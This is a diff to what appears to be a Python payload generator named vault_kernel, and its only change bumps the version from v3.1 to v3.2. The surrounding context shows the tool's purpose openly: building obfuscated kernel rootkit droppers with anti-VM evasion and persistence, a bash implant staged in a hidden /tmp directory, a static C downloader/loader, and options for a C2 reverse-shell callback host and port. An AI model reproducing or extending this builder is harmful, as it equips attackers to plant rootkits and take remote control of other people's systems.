@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-vault_kernel Payload Generator v3.1
+vault_kernel Payload Generator v3.2
 Interactive builder for kernel rootkit delivery payloads.
 Auto-detects local IP, generates obfuscated multi-format payloads
 with anti-VM evasion and persistence.
@@ -110,7 +110,7 @@ def build_bash(host, port, xorkey="", anti_vm=True, persistence=True, obfuscate=
         extract = 'echo "$T" | base64 -d | tar xzf -'
 
     script = f'''#!/bin/bash
-# vault_kernel dropper v3.1 — kernel rootkit implant
+# vault_kernel dropper v3.2 — kernel rootkit implant
 set -e
 export T="/tmp/.$(head -c6 /dev/urandom|base64|tr -dc a-z0-9|head -c8)"
 export H="{host}" P="{port}"
@@ -208,7 +208,7 @@ except Exception as e:print(f"[-] {{e}}")
 # ================================================================
 def build_c(host, port):
     return f'''/*
- * vault_kernel stager v3.1 — minimal C downloader/loader
+ * vault_kernel stager v3.2 — minimal C downloader/loader
  * Compile: gcc -O2 -s -o stager stager.c -static
  * Size: ~15KB static, ~8KB dynamic
  */
@@ -368,7 +368,7 @@ int main(int argc, char **argv) {{
 # ================================================================
 def cli():
     import argparse
-    p = argparse.ArgumentParser(description="vault_kernel v3.1 Payload Generator")
+    p = argparse.ArgumentParser(description="vault_kernel v3.2 Payload Generator")
     p.add_argument("--host", help="C2 IP for reverse shell callback")
     p.add_argument("--port", default="4444", help="C2 port")
     p.add_argument("--format", choices=["bash","python","c","all"], default="bash")
@@ -413,7 +413,7 @@ def cli():
 # ================================================================
 def interactive():
     print("""
-  vault_kernel — Payload Generator v3.1
+  vault_kernel — Payload Generator v3.2
   ruby570bocadito (c) 2026
 """)
     local_ip = get_local_ip()
